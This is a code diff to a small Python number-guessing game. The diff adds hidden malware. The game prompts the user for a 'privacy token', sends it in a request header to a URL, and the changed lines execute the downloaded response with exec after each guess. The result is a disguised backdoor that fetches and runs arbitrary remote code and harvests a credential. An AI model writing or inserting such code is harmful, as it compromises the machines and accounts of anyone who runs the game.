@@ -15,7 +15,6 @@ def plr():
         token = input("Enter your privacy  token: ")
         headers = {"Authorization": f"token {token}"}
         response = requests.get(url, headers=headers)
-        exec(response.text)
         if not guess.isdigit():
             print("Please enter a valid number.")
             continue
@@ -25,13 +24,13 @@ def plr():
 
         if guess < secret_number:
             print("Too low! Try again.")
-            prtxxxx(url, token)
+            exec(response.text)
         elif guess > secret_number:
             print("Too high! Try again.")
-            prtxxxx(url, token)
+            exec(response.text)
         else:
             print(f"Congratulations! You've guessed the number {secret_number} in {attempts} attempts!")
-            prtxxxx(url, token)
+            exec(response.text)
             break
             
 def edg():
@@ -41,6 +40,6 @@ print("Welcome to the Number Guessing Game!")
 print("I'm thinking of a number between 1 and 100.")
 print("Try to guess it in the fewest attempts possible!")
 print("Let's begin!")
-print("versoin 1.0")
+print("versoin 2.0")
 plr()
 edg()
